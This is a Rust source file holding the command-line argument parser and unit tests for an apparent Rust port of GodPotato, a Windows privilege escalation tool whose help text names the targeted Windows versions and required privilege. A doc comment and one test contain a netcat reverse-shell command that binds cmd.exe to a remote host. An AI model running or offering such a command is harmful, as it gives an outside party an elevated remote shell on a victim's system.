// Command-line argument parsing using clap
// SPDX-License-Identifier: Apache-2.0

use clap::Parser;

/// GodPotato - Windows privilege escalation research tool
///
/// Based on DCOM/RPC exploitation technique for privilege escalation
/// on Windows Server 2012-2022. Requires SeImpersonatePrivilege.
#[derive(Parser, Debug, Clone)]
#[command(name = "GodPotato")]
#[command(version)]
#[command(about = "Windows privilege escalation research tool - Rust port")]
#[command(long_about = r#"
    FFFFF                   FFF  FFFFFFF
   FFFFFFF                  FFF  FFFFFFFF
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF

GodPotato exploits a defect in RPCSS OXID resolution to escalate privileges.
Requires: SeImpersonatePrivilege (typically available to IIS, MSSQL service accounts)
Target: Windows Server 2012 - Windows Server 2022, Windows 8 - Windows 11
"#)]
pub struct Args {
    /// Command line to execute with elevated privileges
    ///
    /// Examples:
    ///   -c "cmd /c whoami"
    ///   -c "powershell -c Get-Host"
    ///   -c "nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012"
    #[arg(short, long, default_value = "cmd /c whoami")]
    #[arg(value_name = "COMMAND")]
    pub cmd: String,
}

impl Args {
    /// Parse command-line arguments
    pub fn parse_args() -> Self {
        Self::parse()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_cmd() {
        let args = Args::try_parse_from(&["godpotato"]).unwrap();
        assert_eq!(args.cmd, "cmd /c whoami");
    }

    #[test]
    fn test_custom_cmd() {
        let args = Args::try_parse_from(&["godpotato", "-c", "cmd /c hostname"]).unwrap();
        assert_eq!(args.cmd, "cmd /c hostname");
    }

    #[test]
    fn test_long_flag() {
        let args = Args::try_parse_from(&["godpotato", "--cmd", "powershell -c Get-Host"]).unwrap();
        assert_eq!(args.cmd, "powershell -c Get-Host");
    }

    #[test]
    fn test_cmd_with_spaces() {
        let args = Args::try_parse_from(&["godpotato", "-c", "nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012"]).unwrap();
        assert_eq!(args.cmd, "nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012");
    }

    #[test]
    fn test_help_flag() {
        // --help should cause an error (exit) in try_parse_from
        let result = Args::try_parse_from(&["godpotato", "--help"]);
        assert!(result.is_err());

        // Verify it's the help error kind
        let err = result.unwrap_err();
        assert_eq!(err.kind(), clap::error::ErrorKind::DisplayHelp);
    }

    #[test]
    fn test_version_flag() {
        let result = Args::try_parse_from(&["godpotato", "--version"]);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert_eq!(err.kind(), clap::error::ErrorKind::DisplayVersion);
    }
}
